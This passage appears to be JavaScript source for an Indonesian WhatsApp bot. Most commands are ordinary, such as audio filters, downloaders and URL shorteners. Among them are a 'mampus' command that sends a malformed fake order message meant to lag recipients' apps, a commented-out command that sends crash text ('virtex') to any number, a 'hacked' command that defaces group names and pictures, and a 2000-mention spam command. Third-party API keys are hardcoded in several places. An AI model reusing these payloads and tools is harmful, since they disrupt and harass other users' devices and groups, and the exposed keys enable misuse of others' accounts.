            swsw = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            fernazer = await client.downloadMediaMessage(swsw)
            client.sendMessage('status@broadcast', fernazer, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            client.sendMessage(from, bur, text, { quoted: mek })
            } else {
            reply('Reply gambarnya!')
            }
            break
    case 'upswvideo':
    if (!isOwner) return reply(ind.ownerb)
            if (isQuotedVideo) {
            swsw = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            fernazer = await client.downloadMediaMessage(swsw)
            client.sendMessage('status@broadcast', fernazer, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            client.sendMessage(from, bur, text, { quoted: mek })
            } else {
            reply('reply videonya!')
            }
            break
            case 'restart':
if (!isOwner) return reply(ind.ownerb)
reply('_Restarting BOT_')
exec(`node main`)
setTimeout( () => {
					client.sendMessage(from, '_1_', text) // ur cods
					}, 3000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_2_', text) // ur cods
					}, 2000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, '_3_', text) // ur cods
					}, 1000) // 1000 = 1s,
					setTimeout( () => {
					client.sendMessage(from, `_Succses Restart BOT_`,text,{quoted: freply }) // ur cods
					},4000) // 1000 = 1s,
					break
					/*case 'sendvirtextarget':
				if (!isOwner) return reply('Pesan ini untuk owner kami')
					var FGC = body.slice(7)	client.sendMessage(`${FGC}@s.whatsapp.net`, `${virtex}`, text, {quoted:mek})
					reply('Berhasil mengirim pesan..')
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				break*/
					case '-':
					if (!isOwner) return reply(ind.ownerb)
					await client.toggleDisappearingMessages(from)
    client.sendMessage(from, `Onii Chan`)
					case '+':
					if (!isOwner) return reply(ind.ownerb)
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await client.toggleDisappearingMessages(from, 0)
}
reply('_*©Reneasy™*_')
					break
					case 'mampus':	
					if (!isOwner) return reply(ind.ownerb)
client.sendMessage(mek.key.remoteJid, 'Ciee.. Ngelag', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: 'Onichan',
    orderTitle: '𝙉𝙪𝙧𝙪𝙩𝙤𝙢𝙤', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'getpic':
					if (args.length < 1) return 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Siap Boss')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
						try {
						pp = await client.getProfilePicture(mentioned)
						buffer = await getBuffer(pp)
						
						client.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					} catch (e) {
					await client.sendMessage(from, buffer, image, {quoted: mek, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					}
				break
				case 'getpp':
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
linkpp = await client.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
buffer = await getBuffer(linkpp)
client.sendMessage(from, buffer, image, {caption: "Nih", quoted: mek })
} else if (mek.message.extendedTextMessage.contextInfo.mentionedJid === null || mek.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
mberr = mek.message.extendedTextMessage.contextInfo.participant
linkpp = await client.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
buffer = await getBuffer(linkpp)
client.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
} else if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
mberr = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
linkpp = await client.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
buffer = await getBuffer(linkpp)
client.sendMessage(from, buffer, image, { quoted: mek, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
}
break
case 'getbio':
				if (!isGroup) return reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (args.length < 1) return reply('Tag orangnya!')
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
				const p = await client.getStatus(`${mentioned}`, MessageType.text)
				reply(p.status)
				if (p.status == 401) {
				reply('Error!')
				}
			break
case 'sider':
infom = await client.messageInfo(from, m.quoted.id)
hemm = infom.reads
readdin = hemm.map(v => v.jid)

stamp = hemm.map(v => v.t)
function toTime(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
}
 
//buat index bulan
var months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember'];

 // ambil pecahan waktu masing-masing
var hour = a.getHours();
var min = a.getMinutes();
var sec = a.getSeconds();

// gabungkan ke dalam variable time
var time = hour + ':' + min + ':' + sec ;
return time;
}
teksx = `Wayoloh, ngeread mulu :\n`
hiks = 0
for (let i of hemm) {
hiks += 1
 teksx += `~> @${i.jid.split('@')[0]} > ${toTime(i.t, true)}\n`
 }
client.sendMessage(from, teksx, text, { quoted: mek, contextInfo: { mentionedJid: readdin }})
break  
case 'rptag':
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply("Gada yang di tag")
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
teks = `*Repeat Tag*\n${q}`
teks += "\n\n"
members_id = []
for (let z = 0; z < 2000; z++) {
teks += ` @${mentioned[0].split("@")[0]}`
members_id.push(mentioned[0])
}
mentions(teks, members_id, true)
break
case 'timer':
				if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam")}
				setTimeout( () => {
				reply("Waktu habis")
				}, timer)
				break
				case 'slowmo':
			case 'slow':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await client.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				client.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
				fs.unlinkSync(ran)
				})
				await limitAdd(sender)
			break
			case 'tupai':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				await limitAdd(sender)
				break
				case 'gemok':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				await limitAdd(sender)
				break
			case 'bass':                 
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				await limitAdd(sender)
				break
			case 'robot':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf, Rene telah membanned mu!\nHarap meningkatkan premium untuk terbebas banned selama anda premium!')
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				medial = await client.downloadAndSaveMediaMessage(encmedial)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(medial)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt:true, quoted: mek})
						fs.unlinkSync(ran)
				})
				await limitAdd(sender)
				break
				case 'semoji':  
                    if (!isRegistered) return reply( ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                    emoji = encodeURI(emoji[0])
                    } catch {
                    emoji = encodeURI(emoji)
                    }
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lolkey}`)
                    client.sendMessage(from, ini_buffer, sticker, { quoted: mek})
                   
    	   break
    case 'nickff': 
                 if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
					client.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=${ZeksApi}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Nick* : ${i}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break
    	   case 'tourl2':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            	reply(ind.wait)
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await client.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
            case 'imgtourl':
var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
var jnckk = await  client.downloadAndSaveMediaMessage(encmedia)
var imgbb = require('imgbb-uploader')
imgbb('3b8594f4cb11895f4084291bc655e510', jnckk)
.then(data => {
var caps = `╭─「 IMGBB TO URL 」\n│\n│• ID : ${data.id}\n│• MimeType : ${data.image.mime}\n│• Extension : ${data.image.extension}\n│\n│• URL : ${data.display_url}\n╰─────────────────────`
ibb = fs.readFileSync(jnckk)
client.sendMessage(from, ibb, image, { quoted: freply, caption: caps })
})
.catch(err => {
throw err 
})
break
                   case 'hacked':
              if (!isGroup) return reply(ind.group)
              if (!isBotGroupAdmins) return reply(ind.Badmin)
              if (args.length < 1) return reply('Teksnya?')
              reply('Otw Hack')
                tessgc = await getBuffer(`https://i.ibb.co/9V46knb/651105595c1f.jpg`)
                   client.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                client.groupUpdateSubject(from, `HACKED BY ${body.slice(8)}`)
                await sleep(1000)
                client.groupUpdateDescription(from, `_${pushname} telah meretas grup ini_\n\n*Tidak ada gc yg aman.*`)             
                await sleep(1000)
                client.sendMessage(from, 'Succes Hacked', text, {quoted: mek})
                break
                /*case 'ytsearch':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Melukis Senja`)
                    reply(ind.wait())
                    query = args.join(" ")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Judul : ${x.title}\n`
                        ini_txt += `Viewers : ${x.views}\n`
                        ini_txt += `Published : ${x.published}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
                    }
                    reply(ini_txt)
                    break*/
                    case 'play':   
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				reply(ind.wait())
				playvinz = body.slice(6)
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3/2?apikey=DarrMa123&q=${playvinz}`)
				if (anu.error) return reply(anu.error)
				infomp3vinz = `*Lagu Ditemukan!!!*\nJudul : ${anu.result.title}\nSource : ${anu.result.source}\nUkuran : ${anu.result.size}\n\n*TUNGGU SEBENTAR LAGI DIKIRIM MOHON JANGAN SPAM YA SAYANG*`
				buffer = await getBuffer(anu.result.thumb)
				client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3vinz})
				laguvinz = await getBuffer(anu.result.link)
				client.sendMessage(from, laguvinz, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
				await limitAdd(sender)
			break
                    case 'ytmp3':
				if (!isRegistered) return reply(ind.noregis())
				if (!isPremium) return reply('Maaf kamu bukan user premium!')
				if (isBanned) return reply(ind.baned())
				reply(ind.wait())
				if (args.length < 1) return reply('Urlnya mana kak?')
				if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(ind.stikga())
				anu = await fetchJson(`https://api.zeks.xyz/api/ytmp3/2?url=${args[0]}&apikey=${ZeksApi}`, {method: 'get'})
				if (anu.error) return reply(anu.error)
				teks = `❏ *Title* : ${anu.result.title}\n❏ *Ukuran* : ${anu.result.size}\n\n❏ *Tunggu Bentar Ya Kak, Audionya Lagi Di Kirim...*`
				thumb = await getBuffer(anu.result.thumb)
				client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
				buffer = await getBuffer(anu.result.link)
				client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
				await limitAdd(sender)
			break
			case 'ytmp4':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (!isPremium) return reply('Maaf kamu bukan user premium!')
				if (isBanned) return reply(ind.baned())
				reply(ind.wait())
				if (args.length < 1) return reply('Urlnya mana kak?')
				if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(ind.stikga())
				anu = await fetchJson(`https://api.zeks.xyz/api/ytmp4/2?url=${args[0]}&apikey=${ZeksApi}`, {method: 'get'})
				if (anu.error) return reply(anu.error)
				teks = `❏ *Title* : ${anu.result.title}\n❏ *Ukuran* : ${anu.result.size}\n\n❏ *Tunggu Bentar Ya Kak, Vidoenya Lagi Di Kirim...*`
				thumb = await getBuffer(anu.result.thumb)
				client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
				buffer = await getBuffer(anu.result.link)
				client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.result.title}.mp4`, quoted: mek})
				await limitAdd(sender)
			break
			/*case 'nulis':  
                    if (!isRegistered) return reply(ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} bot whatsapp*`)
                    reply(ind.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis1?text=${F}&APIKEY=${Xteam}`)
                    client.sendMessage(from, anu, image, {caption: `OK it's done\n\nJangan spam ya kak ^_^`, quoted: mek}) 
                    break*/
			case 'nulis2':  
                    if (!isRegistered) return reply(ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} bot whatsapp*`)
                    reply(ind.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${F}&APIKEY=${Xteam}`)
                    client.sendMessage(from, anu, image, {caption: `OK it's done\n\nJangan spam ya kak ^_^`, quoted: mek}) 
                    break 
        case 'nulis3':  
                    if (!isRegistered) return reply(ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} bot whatsapp*`)
                    reply(ind.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis3?text=${F}&APIKEY=${Xteam}`)
                    client.sendMessage(from, anu, image, {caption: `OK it's done\n\nJangan spam ya kak ^_^`, quoted: mek}) 
                    break 
       case 'nulis4':  
                    if (!isRegistered) return reply(ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} bot whatsapp*`)
                    reply(ind.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis?text=${F}&APIKEY=${Xteam}`)
                    client.sendMessage(from, anu, image, {caption: `OK it's done\n\nJangan spam ya kak ^_^`, quoted: mek}) 
                    break 
                    case 'nulis5':  
                    if (!isRegistered) return reply(ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} bot whatsapp*`)
                    reply(ind.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis5?text=${F}&APIKEY=${Xteam}`)
                    client.sendMessage(from, anu, image, {caption: `OK it's done\n\nJangan spam ya kak ^_^`, quoted: mek}) 
                    break 
        case 'nulis6':  
                    if (!isRegistered) return reply(ind.noregis())
			        if (isLimit(sender)) return
			        await limitAdd(sender)
                    if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} bot whatsapp*`)
                    reply(ind.wait) 
                    F = body.slice(8)              			    
                    anu = await getBuffer(`https://api.xteam.xyz/magernulis6?text=${F}&APIKEY=${Xteam}`)
                    client.sendMessage(from, anu, image, {caption: `OK it's done\n\nJangan spam ya kak ^_^`, quoted: mek}) 
                    break
                case 'cerpen':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isBanned) return reply(ind.baned())
				data = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`)
				cerp = `Judul : _${data.result.title}_\nPembuat : _${data.result.pengarang}_\n\n${data.result.cerpen}`
				reply(cerp)
				await limitAdd(sender)
			break
                    case 'qrcode':
			if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
			if (isLimit(sender)) return reply(ind.limitend(pusname))
			const tex = encodeURIComponent(body.slice(8))
			if (!tex) return akira.sendMessage(from, 'MASUKAN URL/TEKS UNTUK DI JADIKAN QR', text, {quoted: mek})
			const buff = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${tex}`)
			client.sendMessage(from, buff, image, {quoted: mek})
			await limitAdd(sender)
			break
				case 'lirik':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				if (args.length < 1) return reply('Lirik lagunya mana kak?')
				liriknyee = body.slice(7)
				anu = await fetchJson(`https://some-random-api.ml/lyrics?title=${liriknyee}`, {method: 'get'})
			  lirisk = `Judul : ${anu.title}\nArtis : ${anu.author}\n\nLirik :\n${anu.lyrics}`
        buffer = await getBuffer(anu.thumbnail.genius)
        client.sendMessage(from, buffer, image, {quoted: mek, caption: lirisk})
				await limitAdd(sender)
			break
					/*case 'lirik':    
               			if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
                		reply(ind.wait)
					teks = body.slice(7)
					anu = await fetchJson(`http://scrap.terhambar.com/lirik?word=${teks}`, {method: 'get'})
					reply('Lirik dari lagu '+teks+' adalah :\n\n'+anu.result.lirik)
					await limitAdd(sender) 
					break*/
				case 'tinyurl':
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				client.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://api.xteam.xyz/shorturl/tinyurl?url=${args[0]}&APIKEY=${Xteam}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'cuttly':	
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				client.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://xteam.xyz/shorturl/cuttly?url=${args[0]}&APIKEY=940675834e0f84eb`)
			let hasil = `link : ${args[0]}\n\nOutput : ${data.result.shortLink}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink2':
				 // Follow My Github	
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Linknya mana kak?')
				client.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://xteam.xyz/shorturl/tinyurl?url=${args[0]}&APIKEY=${Xteam}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink3':
				 // Follow My Github	
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Linknya mana kak?')
				client.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://xteam.xyz/shorturl/bitly?url=${args[0]}&APIKEY=${Xteam}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink4':
				 // Follow My Github	
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Linknya mana kak?')
				client.updatePresence(from, Presence.composing) 
				data = await fetchJson(`http://lolhuman.herokuapp.com/api/shortlink2?url=${args[0]}&apikey=${lolkey}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink5':
				 // Follow My Github	
                 if (!isRegistered) return reply( ind.noregis())
                 if (args.length < 1) return reply('Linknya mana kak?')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				client.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://onlydevcity.herokuapp.com/api/short/vgd?url=${args[0]}&apikey=${onlydev}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.link}`
				reply(hasil)
				await limitAdd(sender)
				break
		case 'shortlink6':
				 // Follow My Github	
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (args.length < 1) return reply('Linknya mana kak?')
				client.updatePresence(from, Presence.composing) 
				data = await fetchJson(`https://onlydevcity.herokuapp.com/api/short/isgd?url=${args[0]}&apikey=${onlydev}`)
				hasil = `link : ${args[0]}\n\nOutput : ${data.result.link}`
				reply(hasil)
				await limitAdd(sender)
				break

				case 'quotesislami':
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
					const islami =['Hal yang paling manis adalah ketika seseorang menyebutkan nama kamu di tahajjud mereka.','Ya Allah panggillah diriku dan orang tuaku ke baitullah dalam keadaan sehat walafiat.','Ya Allah semoga seseorang yang engkau jodohkan denganku adalah seseorang yang saat ini sedang aku perjuangkan.','Allah tidak pernah tidur. Semua pasti akan di balas kelak. Orang-orang jahat yang sekarang bisa tertawa karena banyak uang, berkuasa, tapi besok-besok mereka semua di balas seadil-adilnya.','Jangan putus asa, Allah tidak akan mengecewakan hambanya yang ingin memperbaiki diri.','Percayalah orang yang menasehatimu untuk sholat adalah dia yang paling mencintaimu.','Bukannya Allah tidak tahu sedihmu, Tapi Allah tahu kalau kamu itu kuat.','Bacalah Al-Quran, Ia akan menenangkan hatimu meskipun engkau tidak memahami artinya.','Saat kita sakit hati sama omongan orang, saat itu juga sebenarnya Allah ngajarin kita buat jaga omongan kita ke orang lain. Sederhana bukan?','Di dunia ini orang paling baik pun bisa dicela, dan bahkan orang paling jahat sekalipun bisa di bela.','Al-Quran adalah teman yang tidak akan mengecewakan kamu di dunia dan akhirat.','Cara Allah menjawab doa hambanya : Iyaa.. aku beri untukmu sekarang. Tunggu, aku ingin melihat dulu perjuanganmu. Tidak, aku punya yang lebih baik untukmu.','Dan Allah tidak akan mengadzab mereka selama mereka mau Memohon ampun kepada-Nya. [Al-Anfaal, 8:33]','Kesabaran itu ada dua macam : Sabar atas sesuatu yang tidak kamu ingin. Sabar menahan diri dari sesuatu yang kamu ingini. -Ali bin Abi Thalib','Ambillah kebenaran, jika kamu telah mendengarnya. Karena sungguh di atas kebenaran ada cahaya. (HR. Abu Daud)','Sholatlah agar hatimu tenang, Istighfarlah agar kecewamu hilang, Berdoalah agar bahagiamu segera datang.','Surga itu mahal.. Akan tetapi orang miskin tetap mampu membelinya, Karena harganya bukan pada Harta melainkan Taqwa.','Ya Allah... Perbaikilah lisanku, Perbaikilah hatiku, Perbaikilah akhlakku, Perbaikilah hidupku, Aamiin..','Semoga hari ini Allah memudahkan setiap urusan kita, melapangkan hati kita serta meringankan langkah kita, dalam kebaikan kita Aamiin.','Peganglah aku, bacalah aku setiap hari, karena aku akan menjadi penerang didalam kuburmu nanti. #Al-Quran','Kematian..Kamu terlalu banyak bercanda. Hingga sampai kamu lupa, kematian mungkin tidak menunggumu selesai tertawa.','Jangan khawatirkan rizkimu, karena Allah telah menjaminnya untukmu, namun khawatirkanlah amalanmu, karena Allah tidak menjamin surga-Nya untukmu..','Wahai orang-orang yang beriman! Ingatlah kepada Allah, Dengan mengingat (nama-Nya) sebanyak-banyaknya dan bertasbihlah kepada-nya pada waktu pagi dan petang.','Aku sangat ingin menjadi pemburu surga. Namun aku lupa bahwa aku juga buronan neraka.','Karena aku percaya apapun yang menjadi milikku akan tetap menjadi milikku. Sejauh apapun dia (mencoba) pergi. Sejauh apapun usaha orang lain ingin merebutnya dariku. Aku hanya perlu percaya pada Allah bahwa yang menjadi milikku tidak akan pernah menjadi milik orang lain.','Andai hidayah itu seperti buah yang bisa kubeli, maka akan kubeli berkeranjang-keranjang untuk aku bagikan kepada orang-orang yang aku cintai.','Bila kamu tidak melihatku di syurga. Tolong tanya kepada Allah dimana aku, Tolonglah 